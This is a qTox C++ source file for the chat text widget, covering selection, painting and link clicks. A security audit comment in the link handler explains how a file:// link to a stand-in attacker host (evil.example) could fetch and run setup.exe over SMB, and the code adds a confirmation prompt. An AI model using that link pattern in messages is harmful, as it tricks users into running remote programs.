/*
    Copyright © 2014-2019 by The qTox Project Contributors

    This file is part of qTox, a Qt-based graphical interface for Tox.

    qTox is libre software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    qTox is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with qTox.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "text.h"
#include "../documentcache.h"

#include <QAbstractTextDocumentLayout>
#include <QApplication>
#include <QDebug>
#include <QDesktopServices>
#include <QFontMetrics>
#include <QGraphicsSceneMouseEvent>
#include <QMessageBox>
#include <QPainter>
#include <QPalette>
#include <QTextBlock>
#include <QTextFragment>
#include <QUrl>

Text::Text(DocumentCache& documentCache_, Settings& settings_, Style& style_,
    const QColor& custom, const QString& txt, const QFont& font, bool enableElide,
    const QString& rawText_, const TextType& type)
    : rawText(rawText_)
    , elide(enableElide)
    , defFont(font)
    , textType(type)
    , customColor(custom)
    , documentCache(documentCache_)
    , settings{settings_}
    , defStyleSheet(style_.getStylesheet(QStringLiteral("chatArea/innerStyle.css"), settings_, font))
    , style{style_}
{
    color = textColor();
    setText(txt);
    setAcceptedMouseButtons(Qt::LeftButton);
    setAcceptHoverEvents(true);
}

Text::Text(DocumentCache& documentCache_, Settings& settings_, Style& style_,
    const QString& txt, const QFont& font, bool enableElide, const QString& rawText_,
    const TextType& type)
    : Text(documentCache_, settings_, style_, style_.getColor(Style::ColorPalette::MainText),
        txt, font, enableElide, rawText_, type)
{
}

Text::~Text()
{
    if (doc)
        documentCache.push(doc);
}

void Text::setText(const QString& txt)
{
    text = txt;
    dirty = true;
}

void Text::selectText(const QString& txt, const std::pair<int, int>& point)
{
    regenerate();

    if (!doc) {
        return;
    }

    auto cursor = doc->find(txt, point.first);

    selectText(cursor, point);
}

void Text::selectText(const QRegularExpression &exp, const std::pair<int, int>& point)
{
    regenerate();

    if (!doc) {
        return;
    }

    auto cursor = doc->find(exp, point.first);

    selectText(cursor, point);
}

void Text::deselectText()
{
    dirty = true;
    regenerate();
    update();
}

void Text::setWidth(float w)
{
    width = static_cast<qreal>(w);
    dirty = true;

    regenerate();
}

void Text::selectionMouseMove(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);
    if (cur >= 0) {
        selectionEnd = cur;
        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionStarted(QPointF scenePos)
{
    int cur = cursorFromPos(scenePos);
    if (cur >= 0) {
        selectionEnd = cur;
        selectionAnchor = cur;
    }
}

void Text::selectionCleared()
{
    selectedText.clear();
    selectedText.squeeze();

    // Do not reset selectionAnchor!
    selectionEnd = -1;

    update();
}

void Text::selectionDoubleClick(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);

    if (cur >= 0) {
        QTextCursor cursor(doc);
        cursor.setPosition(cur);
        cursor.select(QTextCursor::WordUnderCursor);

        selectionAnchor = cursor.selectionStart();
        selectionEnd = cursor.selectionEnd();

        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionTripleClick(QPointF scenePos)
{
    if (!doc)
        return;

    int cur = cursorFromPos(scenePos);

    if (cur >= 0) {
        QTextCursor cursor(doc);
        cursor.setPosition(cur);
        cursor.select(QTextCursor::BlockUnderCursor);

        selectionAnchor = cursor.selectionStart();
        selectionEnd = cursor.selectionEnd();

        if (cursor.block().isValid() && cursor.block().blockNumber() != 0)
            selectionAnchor++;

        selectedText = extractSanitizedText(getSelectionStart(), getSelectionEnd());
    }

    update();
}

void Text::selectionFocusChanged(bool focusIn)
{
    selectionHasFocus = focusIn;
    update();
}

bool Text::isOverSelection(QPointF scenePos) const
{
    int cur = cursorFromPos(scenePos);
    if (getSelectionStart() < cur && getSelectionEnd() >= cur)
        return true;

    return false;
}

QString Text::getSelectedText() const
{
    return selectedText;
}

void Text::fontChanged(const QFont& font)
{
    defFont = font;
}

QRectF Text::boundingRect() const
{
    return QRectF(QPointF(0, 0), size);
}

void Text::paint(QPainter* painter, const QStyleOptionGraphicsItem* option, QWidget* widget)
{
    std::ignore = option;
    std::ignore = widget;

    if (!doc)
        return;

    painter->setClipRect(boundingRect());

    // draw selection
    QAbstractTextDocumentLayout::PaintContext ctx;
    QAbstractTextDocumentLayout::Selection sel;

    if (hasSelection()) {
        sel.cursor = QTextCursor(doc);
        sel.cursor.setPosition(getSelectionStart());
        sel.cursor.setPosition(getSelectionEnd(), QTextCursor::KeepAnchor);
    }

    const QColor selectionColor = style.getColor(Style::ColorPalette::SelectText);
    sel.format.setBackground(selectionColor.lighter(selectionHasFocus ? 100 : 160));
    sel.format.setForeground(selectionHasFocus ? Qt::white : Qt::black);

    ctx.selections.append(sel);
    ctx.palette.setColor(QPalette::Text, color);

    // draw text
    doc->documentLayout()->draw(painter, ctx);
}

void Text::visibilityChanged(bool visible)
{
    keepInMemory = visible;

    regenerate();
    update();
}

void Text::reloadTheme()
{
    defStyleSheet = style.getStylesheet(QStringLiteral("chatArea/innerStyle.css"), settings, defFont);
    color = textColor();
    dirty = true;
    regenerate();
    update();
}

qreal Text::getAscent() const
{
    return ascent;
}

void Text::mousePressEvent(QGraphicsSceneMouseEvent* event)
{
    if (event->button() == Qt::LeftButton)
        event->accept(); // grabber
}

void Text::mouseReleaseEvent(QGraphicsSceneMouseEvent* event)
{
    if (!doc)
        return;

    QString anchor = doc->documentLayout()->anchorAt(event->pos());

    if (anchor.isEmpty())
        return;

    // KHANDAQ (audit 2026-08-20): a chat message is attacker-controlled text, and the formatter
    // linkifies file:// and smb:// (textformatter.cpp), so a contact or any member of a group could
    // put a one-click launcher in the chat log. `file://evil.example/share/setup.exe` becomes the
    // UNC path //evil.example/share/setup.exe, which ShellExecute happily fetches over SMB/WebDAV
    // and runs — no prior file transfer needed, and nothing here asked the user anything. Files
    // written by Khandaq get no Mark-of-the-Web either, so the OS raises no warning of its own.
    //
    // The product already treats exactly this action as needing consent everywhere else: opening a
    // received file through the transfer widget goes through MessageBoxManager::confirmExecutableOpen,
    // and Android shows a URL confirmation dialog for every link tapped in a message. This is the
    // one path that did not ask. It asks now, and it shows the full target, because the whole risk
    // is that the target is not what the sentence around it implies.
    const QUrl url(anchor);
    const QString scheme = url.scheme().toLower();
    if (scheme == QStringLiteral("file") || scheme == QStringLiteral("smb")) {
        const QMessageBox::StandardButton answer = QMessageBox::warning(
            nullptr, tr("Open a local or network file?", "popup title"),
            tr("This link opens a file on your computer or network:\n\n%1\n\n"
               "Opening it can run a program on your computer. Links in messages come from other "
               "people. Open it anyway?", "popup text")
                .arg(url.toString()),
            QMessageBox::Yes | QMessageBox::No, QMessageBox::No);
        if (answer != QMessageBox::Yes)
            return;
    }

    // open anchor in browser
    QDesktopServices::openUrl(url);
}

void Text::hoverMoveEvent(QGraphicsSceneHoverEvent* event)
{
    if (!doc)
        return;

    QString anchor = doc->documentLayout()->anchorAt(event->pos());

    if (anchor.isEmpty())
        setCursor(Qt::IBeamCursor);
    else
        setCursor(Qt::PointingHandCursor);

    // tooltip
    setToolTip(extractImgTooltip(cursorFromPos(event->scenePos(), false)));
}

QString Text::getText() const
{
    return rawText;
}

/**
 * @brief Extracts the target of a link from the text at a given coordinate
 * @param scenePos Position in scene coordinates
 * @return The link target URL, or an empty string if there is no link there
 */
QString Text::getLinkAt(QPointF scenePos) const
{
    QTextCursor cursor(doc);
    cursor.setPosition(cursorFromPos(scenePos));
    return cursor.charFormat().anchorHref();
}

void Text::regenerate()
{
    if (!doc) {
        doc = documentCache.pop();
        dirty = true;
    }

    if (dirty) {
        doc->setDefaultFont(defFont);

        if (elide) {
            QFontMetrics metrics = QFontMetrics(defFont);
            QString elidedText = metrics.elidedText(text, Qt::ElideRight, qRound(width));

            doc->setPlainText(elidedText);
        } else {
            doc->setDefaultStyleSheet(defStyleSheet);
            doc->setHtml(text);
        }

        // wrap mode
        QTextOption opt;
        opt.setWrapMode(elide ? QTextOption::NoWrap : QTextOption::WrapAtWordBoundaryOrAnywhere);
        doc->setDefaultTextOption(opt);

        // width
        doc->setTextWidth(width);
        doc->documentLayout()->update();

        // update ascent
        if (doc->firstBlock().layout()->lineCount() > 0)
            ascent = doc->firstBlock().layout()->lineAt(0).ascent();

        // let the scene know about our change in size
        if (size != idealSize())
            prepareGeometryChange();

        // get the new width and height
        size = idealSize();

        dirty = false;
    }

    // if we are not visible -> free mem
    if (!keepInMemory)
        freeResources();
}

void Text::freeResources()
{
    documentCache.push(doc);
    doc = nullptr;
}

QSizeF Text::idealSize()
{
    if (doc)
        return doc->size();

    return size;
}

int Text::cursorFromPos(QPointF scenePos, bool fuzzy) const
{
    if (doc)
        return doc->documentLayout()->hitTest(mapFromScene(scenePos),
                                              fuzzy ? Qt::FuzzyHit : Qt::ExactHit);

    return -1;
}

int Text::getSelectionEnd() const
{
    return qMax(selectionAnchor, selectionEnd);
}

int Text::getSelectionStart() const
{
    return qMin(selectionAnchor, selectionEnd);
}

bool Text::hasSelection() const
{
    return selectionEnd >= 0;
}

QString Text::extractSanitizedText(int from, int to) const
{
    if (!doc)
        return "";

    QString txt;

    QTextBlock begin = doc->findBlock(from);
    QTextBlock end = doc->findBlock(to);
    for (QTextBlock block = begin; block != end.next() && block.isValid(); block = block.next()) {
        for (QTextBlock::Iterator itr = block.begin(); itr != block.end(); ++itr) {
            int pos = itr.fragment().position(); // fragment position -> position of the first
                                                 // character in the fragment

            if (itr.fragment().charFormat().isImageFormat()) {
                QTextImageFormat imgFmt = itr.fragment().charFormat().toImageFormat();
                QString key = imgFmt.name(); // img key (eg. key::D for :D)
                QString rune = key.mid(4);

                if (pos >= from && pos < to) {
                    txt += rune;
                    ++pos;
                }
            } else {
                for (QChar c : itr.fragment().text()) {
                    if (pos >= from && pos < to)
                        txt += c;

                    ++pos;
                }
            }
        }

        txt += '\n';
    }

    txt.chop(1);

    return txt;
}

QString Text::extractImgTooltip(int pos) const
{
    for (QTextBlock::Iterator itr = doc->firstBlock().begin(); itr != doc->firstBlock().end(); ++itr) {
        if (itr.fragment().contains(pos) && itr.fragment().charFormat().isImageFormat()) {
            QTextImageFormat imgFmt = itr.fragment().charFormat().toImageFormat();
            return imgFmt.toolTip();
        }
    }

    return QString();
}

void Text::selectText(QTextCursor& cursor, const std::pair<int, int>& point)
{
    if (!cursor.isNull()) {
        cursor.beginEditBlock();
        cursor.setPosition(point.first);
        cursor.setPosition(point.first + point.second, QTextCursor::KeepAnchor);
        cursor.endEditBlock();

        QTextCharFormat format;
        format.setBackground(QBrush(style.getColor(Style::ColorPalette::SearchHighlighted)));
        cursor.mergeCharFormat(format);

        regenerate();
        update();
    }
}

QColor Text::textColor() const
{
    QColor c = style.getColor(Style::ColorPalette::MainText);
    if (textType == ACTION) {
        c = style.getColor(Style::ColorPalette::Action);
    } else if (textType == CUSTOM) {
        c = customColor;
    }

    return c;
}
